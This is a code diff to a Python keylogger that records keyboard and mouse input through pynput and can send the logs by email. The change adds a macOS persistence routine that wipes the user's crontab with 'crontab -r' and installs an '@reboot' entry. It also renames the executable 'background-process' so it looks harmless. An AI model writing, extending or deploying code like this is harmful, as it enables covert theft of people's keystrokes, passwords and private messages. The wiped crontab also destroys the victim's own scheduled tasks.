@@ -8,6 +8,7 @@ import json
 import os
 from pynput import keyboard, mouse
 import smtplib
+import sys
 import threading
 
 """
@@ -20,6 +21,18 @@ def timestamp():
 
 def sort_dict_descending_keys(dictionary):
     return sorted(dictionary.items(), key=lambda pair: pair[1], reverse=True)
+
+def setup_crontab(exe_name):
+    """
+        This function ensures that the keylogger executable is run on startup
+        Expects an exectuable file in the home directory
+    """
+    # delete the crontab file and disregard any errors (ie. if there was no crontab file to begin with)
+    os.system("crontab -r > /dev/null 2>&1")
+    # make a new crontab by filling it with an empty line
+    os.system("echo '' | crontab -")
+    # update the crontab
+    os.system(f"( crontab -l; printf '@reboot \"~{exe_name}\"\n' ) | crontab -")
 
 """
     EMAIL SENDING
@@ -61,10 +74,11 @@ def get_focus_app_string():
 class Monitor:
     def __init__(self):
         # settings
+        self.exe_name = 'background-process'
         self.log_folder = 'logs'
         self.log_interval = 15
         self.passphrase = 'fishing-in-the-river-champion'
-        self.log_via_email = True
+        self.log_via_email = False
 
         # state variables
         self.logs = list()
@@ -135,6 +149,10 @@ class Monitor:
             self.record_raw_input({'m' : button.name.upper()})
 
     def run(self):
+        # run crontab on MacOS to ensure exe starts on system boot
+        if sys.platform.startswith('darwin'):
+            setup_crontab(self.exe_name)
+
         # create the logs folder if it does not exist if running in file logging mode
         if not self.log_via_email:
             try:
